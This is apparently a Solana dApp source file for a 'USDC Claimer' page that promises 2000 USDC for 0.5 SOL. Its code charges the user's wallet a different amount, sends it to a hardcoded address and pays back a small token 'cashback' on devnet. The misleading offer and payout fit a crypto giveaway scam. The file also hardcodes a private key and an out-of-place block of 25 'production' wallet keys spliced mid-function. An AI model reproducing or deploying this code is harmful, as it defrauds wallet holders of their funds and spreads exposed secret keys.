/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "zkBmCex2WvwARJTzVVQZvWUSjHCEC4QqrTUYCVHy7eU35zvokXrQjwyac3oELrbNcecbNAxtqToMsg2JQeSvXu6"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3G3kNpDsg9WKtMcFrMWbaFQCDFB5R6RVCwrCD1WKqLVgqNJYDptZ2wPuAaLB6ycBFGY5LRxEtqbGc19oQSKUdZwf",
  "key1": "2PU6JSLWiANTpgB2rqLWgxUhyjqFBzMN6iURjNSkxgd6CR6tMXEQ9vaxXZA3ww7uzgNrtXtMwoXMnfzaxBX8rgVf",
  "key2": "5Np4uasQJgsiWnksfoVauVT7FH47QstUuURbbz5Q1R7S24AAJwv4RzoHALcPSW2JDFiuaTUuHpo8GhLGjJzzyefr",
  "key3": "QgXeinxdGz4PfJEuPb51W3qLRMcf1EV7ztZhN6LoeTGzVRGhh5Urouy3KQFUdsHeiiCygD9zDRCirj3gcBQrNYD",
  "key4": "2VBpWZgpxdJ6icXACbXv3ftP2dMdau7eBQ6xiQVWzdx1FFVJb2jyYuYs8Xsx565d6B9gHErJ5SbFmmEg6t2bXEQf",
  "key5": "tBK8pxEin8wGskGHje27kMAj61PzEHJZtvBFfBPUhx45w8CoF4ez7xmVWEyXEBcG6reJ2vY6wzpJYnhHXKneG4s",
  "key6": "ozxvtfi4HrU98Qze9DhurSfKRcF5b6H8mfEPiLjeyd8zYRykxLsYfP7G2wwfiWmu4dK4aJVTAPRtERLMPMjTHjC",
  "key7": "33wURKiTGZkgK2AiF8ri6inWDM5nHWb1AAakXMAsf5v3NhMS11JJQQ99QfdTvQ5vK7U4mQqpRecnrq9Ny1qtiwM4",
  "key8": "3tZV62RmtSScfqQhYHUXh7N1KtkCB7WDU5ZKZGfWJiJixKEKNJdQ7PhoD91BiPK6vncg5kVqcjXLtzxLvXTt1w23",
  "key9": "3CMXFU7DnsbPw2LNmaqGJ1fYeokaWnr4qGHBm2CXJDPir6fy7cqqdXTB6vGMsvCgrqfdv1g1sy5ZpNDJCRaKtLmN",
  "key10": "2DvYWYx1D1BiJHeuYqPUfibYgs3Z6vXDoJa3NcMh8AxmdiPCUhh5814w4A4tVwqLjeJS6XAQxTsTjwCbLqoL13fG",
  "key11": "21eUBQdBX1dMi3iqfR4pVjHJ9v9mWtwAFUNyX96Z4VbrRP6aiLgn9bRdF84xhs1BBeaeUNWmzk2sNVdqL3RfcNK8",
  "key12": "5o6WhCL7enwJdtteEjERk5ovn7vh7fcXjruiuw97V8jzrzU34CtbbRrmPYFRWUZRtCRGnruyEG2kyi9w7nuBm8ns",
  "key13": "rHykBGaDX1bc6z1NHag3hMNWa2cDvvGLR7feKQvdqQoYVLJ93YVtwsW9uyWiiG95kUR15ZxTrNaJuLRjZLGXJFn",
  "key14": "2vYtZQwCAwzmFSMGMizTiCehcc2TEn65ofEgSupVZYMhMF7dwT9Pszqz8es4ejDj58myfr2sfLcpvFiBT2LERqG",
  "key15": "L6J4DXTjeVPK5MBohxriUYoFtKBY682BgVkFWbnJvoNBUzCGEYP6mbg7VemcyvkbDbAwGNmTSEVpt8f2T1ot4Qe",
  "key16": "38cLAbQHmSDpDLq8tGwcNFFe62o9XbVJmh17MZKGVykrhxkdgazsiwUwhvQtv7GXTFNPW9gV4XG9R8MJckY2C73Z",
  "key17": "5KgACcS5p1DwmdDEHy45yFbNcu3kGjwLW5PKJsvhx7CchUdFkKVjnKQjJBhkVftrBshj8e16oJGzZ3Nhj48ggEDm",
  "key18": "3DwwSmea5gjmZZrFbWgVvcbp2MmFe5uNBmS1DCNUmtpwcSMKCUGuLTeDSZGHuYYYwNCVn27oy2JyafbeG5A1v4kF",
  "key19": "3oAEg5cFdKzHRBKtABibyEu5JiTKcgrdTcYrZP3vKgkLdAKn4aRVrEek2Hc1wqH9toy2eHXfGRkWjgGzWYG4W97Q",
  "key20": "3tFtvhjSDA8Zs9jgtt2TeE7hvHp3vdopKs5hwWMVZGpVPkFUKeqkcHHV6NvXJNPSUxdiWUsneAfSgRWt3CWvWVEh",
  "key21": "5UTBy2sXMBLG17aDVURvoAf55f1J7t9md7eNmuCtG9i46YBLeXArYS1XL4pT6mnmubUjqgB1pgLXAezCJDvi5PCp",
  "key22": "2S1df9VsH6YJ7SRuUmvWBdL7tT9fVW5gWvMqncrJER6bRmbyeJXPNNFRXzPnarN6ZAr5HbSVhqjiK4nPXf61aboa",
  "key23": "2XFspjRxy8DWBWoAakYLqR3TQvmxqRdpQwmzNL7EbTnGmAqoLQhTN8vtSF9AE4SyZDEj8LEMbrmNo7Jq49ympfBS",
  "key24": "3WftQsoS3vxc93picKZNwpQDfuPX6CyBUPJcTgyPmL9PJ3ZMPb3wnHjuJyxoCv5Ld1aeiKRk557b49ZiZZuUAc8b"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
